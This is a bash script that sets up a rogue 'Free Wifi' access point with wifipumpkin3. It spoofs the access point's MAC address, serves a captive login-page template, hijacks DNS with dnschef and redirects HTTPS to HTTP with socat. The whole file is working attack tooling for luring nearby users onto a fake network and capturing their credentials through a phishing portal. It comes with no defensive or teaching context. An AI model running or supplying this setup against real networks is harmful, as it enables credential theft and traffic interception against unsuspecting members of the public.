#!/bin/bash

APIFACE=wlan1
NETIFACE=wlan0
SSID="Free Wifi"
BSSID=00:11:22:33:44:55
CHANNEL=1
TEMPLATE="Login_v4"
GATEWAY_IP="10.0.0.1"
SOCAT_PID=""

# Strip any quotes from SSID variable (in case they were accidentally included)
STRIPPED_SSID=$(echo "$SSID" | sed 's/^"//;s/"$//' | sed "s/^'//;s/'$//")

# --- Installation checks ---
command -v wifipumpkin3 >/dev/null 2>&1 || { echo 'wifipumpkin3 is missing, installing..'; apt update && apt install wifipumpkin3 -y; }
command -v dnschef >/dev/null 2>&1 || { echo 'dnschef is missing, installing..'; apt update && apt install dnschef -y; }
command -v socat >/dev/null 2>&1 || { echo 'socat is missing, installing..'; apt update && apt install socat -y; }

# --- Interface and rule checks ---
echo "Checking if config folder exists.."
if [[ ! -d /root/.config/wifipumpkin3 ]]; then
  wifipumpkin3 -xpulp 'exit'
fi
echo "Checking default rule number.."
for table in $(ip rule list | awk -F"lookup" '{print $2}'); do
DEF=$(ip route show table $table|grep default|grep $NETIFACE)
  if ! [ -z "$DEF" ]; then
     break
  fi
done
echo "Default rule number is $table"
echo "Checking for existing $APIFACE interface.."
if ip link show $APIFACE; then
  echo "$APIFACE exists, continuing.."
  set -x
  echo "Spoofing MAC address for $APIFACE..."
  ip link set dev $APIFACE address $BSSID
  ip link set up dev $APIFACE
  ip link show $APIFACE
  set +x
else
  if [[ $WLAN0TO1 == 1 ]]; then
    if [[ $(iw list | grep '* AP') == *"* AP"* ]]; then
      echo "wlan0 supports AP mode, creating AP interface.."
      iw dev wlan0 interface add $APIFACE type __ap
      CREATED_APIFACE=1
      ip addr flush $APIFACE
      ip link set $APIFACE down
    else
      echo "wlan0 doesn't support AP mode, exiting.."
      exit 0
    fi
  fi
fi

# Function to setup captive portal routing (no internet access)
setup_captive_routing() {
    echo "Setting up captive portal routing (blocking internet access).."
    ip rule add from all lookup main pref 1 2> /dev/null
    ip rule add from all iif lo oif $APIFACE uidrange 0-0 lookup 97 pref 11000 2> /dev/null
    ip rule add from all iif lo oif $APIFACE lookup 97 pref 17000 2> /dev/null
    echo "200 captive" >> /etc/iproute2/rt_tables 2>/dev/null || true
    ip rule add from all iif $APIFACE lookup 200 pref 21000 2> /dev/null
    ip route add 10.0.0.0/24 dev $APIFACE table 200 2> /dev/null || true
    ip route del default table 200 2> /dev/null || true

    # NOTE: socat will be started AFTER wifipumpkin3 is running
}

# Function to setup normal internet sharing
setup_internet_sharing() {
    echo "Setting up normal internet sharing.."
    ip rule add from all lookup main pref 1 2> /dev/null
    ip rule add from all iif lo oif $APIFACE uidrange 0-0 lookup 97 pref 11000 2> /dev/null
    ip rule add from all iif lo oif $NETIFACE lookup $table pref 17000 2> /dev/null
    ip rule add from all iif lo oif $APIFACE lookup 97 pref 17000 2> /dev/null
    ip rule add from all iif $APIFACE lookup $table pref 21000 2> /dev/null
}

# Function to start socat after wifipumpkin3 is running
start_socat_https_redirect() {
    echo "Waiting for wifipumpkin3 to fully initialize..."
    sleep 10
    
    echo "Checking if gateway IP is available..."
    while ! ping -c 1 -W 1 $GATEWAY_IP >/dev/null 2>&1; do
        echo "Waiting for $GATEWAY_IP to be available..."
        sleep 2
    done
    
    echo "Starting socat to redirect HTTPS to HTTP..."
    # Only redirect HTTPS (443) to HTTP (80) - keep it simple
    socat TCP4-LISTEN:443,fork,reuseaddr TCP4:$GATEWAY_IP:80 &
    SOCAT_PID=$!
    echo "socat HTTPS->HTTP started with PID $SOCAT_PID"
}

# Setup routing based on TEMPLATE variable
if [[ ! $TEMPLATE == "" ]]; then
    echo "TEMPLATE is set: $TEMPLATE - Setting up captive portal mode"
    setup_captive_routing
    TemplateCMD=" set captiveflask.$TEMPLATE true;"
    CaptiveCMD=" set proxy captiveflask true;"
    echo "Starting DNSChef for DNS hijacking.."
    sleep 20 && dnschef --fakeip $GATEWAY_IP --interface $GATEWAY_IP &
    DNSCHEF_PID=$!
    
    # Start socat in background AFTER wifipumpkin3 starts
    start_socat_https_redirect &
else
    echo "TEMPLATE is empty - Setting up normal internet sharing"
    setup_internet_sharing
    CaptiveCMD=" set proxy noproxy;"
    echo "Starting DNSChef for normal DNS.."
    sleep 20 && dnschef --interface $GATEWAY_IP &
    DNSCHEF_PID=$!
fi

# --- Wifipumpkin3 start ---
echo "DEBUG: Original SSID: [$SSID]"
echo "DEBUG: Stripped SSID will be used: [$STRIPPED_SSID]"
echo "DEBUG: TEMPLATE: [$TEMPLATE]"
echo "DEBUG: Captive mode: $([[ ! $TEMPLATE == "" ]] && echo "YES" || echo "NO")"
echo "Starting wifipumpkin3.."
wifipumpkin3 --xpulp "set interface $APIFACE; set interface_net $NETIFACE; set ssid $STRIPPED_SSID; set bssid $BSSID; set channel $CHANNEL;${CaptiveCMD}${TemplateCMD} start; ap"

# Cleanup
echo "Cleaning up processes.."
pkill python3
kill $DNSCHEF_PID 2>/dev/null || true

# Kill socat if it was started
if [ ! -z "$SOCAT_PID" ]; then
    echo "Stopping socat (PID: $SOCAT_PID)..."
    kill $SOCAT_PID 2>/dev/null || true
fi

# Delete the created AP interface if we created it
if [[ $CREATED_APIFACE == 1 ]]; then
    echo "Deleting created AP interface $APIFACE..."
    iw dev $APIFACE del 2>/dev/null || true
fi

# --- Cleanup routing rules ---
echo "Restoring routing rules.."
ip rule del from all lookup main pref 1 2> /dev/null
ip rule del from all iif lo oif $APIFACE uidrange 0-0 lookup 97 pref 11000 2> /dev/null
ip rule del from all iif lo oif $NETIFACE lookup $table pref 17000 2> /dev/null
ip rule del from all iif lo oif $APIFACE lookup 97 pref 17000 2> /dev/null
ip rule del from all iif $APIFACE lookup $table pref 21000 2> /dev/null
ip rule del from all iif $APIFACE lookup 200 pref 21000 2> /dev/null
ip route flush table 200 2> /dev/null || true
